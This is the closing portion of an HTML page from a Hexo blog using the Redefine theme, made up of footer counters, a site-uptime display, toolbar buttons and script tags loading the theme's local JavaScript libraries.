                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.6</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fa-regular fa-comments"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>







<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/libs/anime.min.js"></script>

        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


    <div id="aplayer"></div>

<script src="/js/libs/APlayer.min.js"></script>


<script src="/js/plugins/aplayer.js"></script>


</body>
</html>
